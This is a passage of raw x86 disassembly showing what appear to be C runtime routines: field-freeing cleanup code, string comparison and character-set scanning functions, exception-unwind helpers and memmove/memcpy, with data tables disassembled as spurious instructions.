  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
